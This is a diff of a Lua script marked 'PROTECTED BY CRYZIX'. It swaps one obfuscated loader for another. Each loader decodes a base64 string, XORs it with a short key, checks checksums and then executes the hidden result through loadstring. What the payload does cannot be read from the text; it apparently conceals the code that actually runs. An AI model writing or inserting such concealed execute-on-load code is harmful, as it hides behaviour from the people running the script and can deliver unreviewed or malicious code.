@@ -1,16 +1,8 @@
 --[[ PROTECTED BY CRYZIX ]]--
-local wLbpQM="PAElFjETIgcqFWoAMQMhSAoTJB4DFzZPcgYwBjIUakFrFCsLNR1qESMTMgE8XC8INUEmHTZQYQtqBjoTckdtWms=" local rDTtME="PnDrBg" local WMx2xQ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=WMx2xQ:find(c1)-1,WMx2xQ:find(c2)-1 local c=(c3=="=")and 0 or WMx2xQ:find(c3)-1 local d=(c4=="=")and 0 or WMx2xQ:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
+local XkHC8F="FDg1EUsDCj46EhAQGToxT3ADDCcTEExfWj8gAUgEQnh7E1EbHSR6FlkDGjgsW1UYHXg6GVcSETB6IWAjWn59XRE=" local L2n5fP="xWTu8w" local ZJNrBK="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=ZJNrBK:find(c1)-1,ZJNrBK:find(c2)-1 local c=(c3=="=")and 0 or ZJNrBK:find(c3)-1 local d=(c4=="=")and 0 or ZJNrBK:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
 local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
-local sum=0 for i=1,#wLbpQM do sum=(sum+wLbpQM:byte(i))%65536 end if sum~=7584 then return end
-local tmp=decode(wLbpQM) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),rDTtME:byte((i-1)%#rDTtME+1)))) end
-local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=5837 then return end
-local run=(loadstring or load) run(script)()
---[[ PROTECTED BY CRYZIX ]]--
-local F0riTU="GhcnNxETBBEoNEoAFxUjaSoTAggBNhZPVBAyJxIUTFdpNQsLEwtoMAMTFBc+fQ8IE1clO1QFHBVoBzozVFFve0s=" local YMfoso="vxFSbg" local rcPhKw="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=rcPhKw:find(c1)-1,rcPhKw:find(c2)-1 local c=(c3=="=")and 0 or rcPhKw:find(c3)-1 local d=(c4=="=")and 0 or rcPhKw:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
-local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
-local sum=0 for i=1,#F0riTU do sum=(sum+F0riTU:byte(i))%65536 end if sum~=7558 then return end
-local tmp=decode(F0riTU) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),YMfoso:byte((i-1)%#YMfoso+1)))) end
-local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=5781 then return end
+local sum=0 for i=1,#XkHC8F do sum=(sum+XkHC8F:byte(i))%65536 end if sum~=7082 then return end
+local tmp=decode(XkHC8F) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),L2n5fP:byte((i-1)%#L2n5fP+1)))) end
+local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=5849 then return end
 local run=(loadstring or load) run(script)()
